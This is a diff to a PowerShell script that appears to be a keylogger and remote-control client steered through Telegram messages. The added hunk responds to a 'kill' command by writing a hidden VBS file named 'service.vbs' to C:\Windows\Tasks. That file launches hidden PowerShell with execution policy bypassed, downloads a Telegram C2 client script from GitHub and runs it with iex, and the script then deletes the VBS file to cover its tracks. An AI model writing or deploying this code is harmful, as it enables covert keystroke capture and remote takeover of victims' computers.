@@ -404,7 +404,18 @@ While ($true){
         if ($messages.message.text -contains "kill") {
         $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
         Post-Message | Out-Null
-        break
+        $tobat = @"
+Set WshShell = WScript.CreateObject(`"WScript.Shell`")
+WScript.Sleep 200
+WshShell.Run `"powershell.exe -NonI -NoP -Ep Bypass -W H -C `$tg='$tg'; irm https://raw.githubusercontent.com/beigeworm/PoshGram-C2/main/Telegram-C2-Client.ps1 | iex`", 0, True
+"@
+        $pth = "C:\Windows\Tasks\service.vbs"
+        $tobat | Out-File -FilePath $pth -Force
+        & $pth
+        Sleep 5
+        rm -Path $pth
+        Write-Output "Restarting C2.. You must re-authenticate!"
+        exit
         }
     }
     finally{
@@ -822,4 +833,3 @@ $messages=ReceiveMSG
         }
     }
 }
-
